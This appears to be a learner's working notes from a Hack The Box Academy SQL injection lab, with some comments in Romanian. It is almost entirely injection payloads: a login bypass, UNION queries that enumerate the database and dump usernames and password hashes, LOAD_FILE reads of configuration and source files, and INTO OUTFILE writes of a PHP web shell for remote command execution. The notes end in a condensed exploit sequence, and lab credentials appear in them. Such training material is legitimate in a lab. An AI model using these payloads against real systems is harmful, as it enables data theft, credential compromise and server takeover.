CTF SOURCE: hackthebox academy - basics of sql injection module, final exercise

' OR '1'='1' OR '1'='1

' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '', '' into outfile '/var/www/html/shell.php' -- 
' UNION SELECT '', LOAD_FILE('/etc/apache2/apache2.conf'), '', '', '' -- 
' UNION SELECT '', LOAD_FILE('/var/www/html/index.php'), '', '', '' -- 
' UNION SELECT '', LOAD_FILE('/var/www/html/dashboard/dashboard.php'), '', '', '' -- 
' UNION SELECT '', LOAD_FILE('/var/www/html/config.php'), '', '', '' -- 
' UNION SELECT '', LOAD_FILE('/var/www/html/dashboard/../../../../home/'), '', '', '' -- 
' UNION SELECT 1, , '', '', '' -- 

' UNION SELECT 1, SCHEMA_NAME, 3, 4, 5 from INFORMATION_SCHEMA.SCHEMATA-- 
' UNION SELECT 1, TABLE_NAME, 3,4, 5 from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'backup' -- 
' UNION SELECT 1, COLUMN_NAME, 3, 4, 5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'admin_bk' AND TABLE_NAME = 'users' -- 
' UNION SELECT 1, username, password, 3, 4 FROM backup.admin_bk -- 

# admin Inl@n3_fre1gh7_adm!n

' UNION SELECT 1, COLUMN_NAME, 3, 4, 5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'ilfreight' AND TABLE_NAME = 'users' -- 
' UNION SELECT 1, username, password, 3, 4 FROM ilfreight.users -- 

# adam 1be9f5d3a82847b8acca40544f953515

# cum aflu user ul curent
' UNION SELECT '', USER(), '', '', '' -- 
' UNION SELECT '', CURRENT_USER(), '', '', '' -- 

# known paths:
/var/www/html/		index.php
			dashboard/dashboard.php
			config.php
			
# check permissions for db user
asdasd' UNION SELECT '', super_priv, '', '', '' FROM mysql.user WHERE user="root"-- 
			
# get config file
' UNION SELECT '', LOAD_FILE('/var/www/html/config.php'), '', '', '' -- 

# get index page source code
' UNION SELECT '', LOAD_FILE('/var/www/html/index.php'), '', '', '' -- 

# get dashboard source code
' UNION SELECT '', LOAD_FILE('/var/www/html/dashboard/dashboard.php'), /*!32302 1/0, */ '', '', '' -- 

# nu pot scrie un web shell in /var, cu urm comanda: 
asdasd' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '', '' into outfile '/var/www/html/shell.php' -- 
asdasd' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '', '' into outfile '/var/www/shell.php' -- 

# incerc sa creez un web shell in /tmp (unde pot scrie)
# al doilea query este de verificare

asdasd' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '', '' into outfile '/tmp/shell2.php' -- 
asdasd' UNION SELECT '', LOAD_FILE('/var/www/html/dashboard/../../../../tmp/shell2.php'), '', '', '' -- 

# file writes
' UNION SELECT '', 'test file', '', '', '' into outfile '/usr/lib/testf.txt' -- 

# dunno
asd' UNION SELECT 1, TABLE_NAME, 3,4, 5 from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'ilfreight' -- why?
asd' UNION SELECT '', '', '', '', ''; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; -- cannot execute multiple q
' UNION SELECT '', LOAD_FILE('/var/lib/mysql/ilfreight'), '', '', '' -- does not work
asdasd' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '', '' into outfile '/var/www/html/dashboard/shell3.php -- 
asdasd' UNION SELECT '', LOAD_FILE('/var/www/html/dashboard/shell3.php'), '', '', '' -- 

asdasd' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '', '' into outfile '/var/www/html/dashboard/shell3.php' -- 
asdasd' UNION SELECT '', LOAD_FILE('/var/www/html/dashboard/shell3.php'), '', '', '' -- 

#
#
# ce pot face?
# -> citesc toata baza de date
# -> incarc orice fisier
# -> (orice altcv cu drepturi de admin in db?)
# -> nu am drepturi de write in web root dir (/var/www/)
# -> nu pot executa mai multe query uri pe langa SELECT ... UNION
# -> nu am acces la mysql API (???)
#
# trebuie sa deschid un shell (remote code execution)

# incerc cu Os() ??????????????????
asdasd' UNION SELECT '', mysql.Os('ls'), '', '', '' -- 
asdasd' UNION SELECT '', mysql.os.getcwd(), '', '', '' -- 

exploit: 
1. ' OR '1'='1' OR '1'='1
asdasd' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '', '' into outfile '/var/www/html/dashboard/shell3.php' -- 
asdasd' UNION SELECT '', LOAD_FILE('/var/www/html/dashboard/shell3.php'), '', '', '' -- 
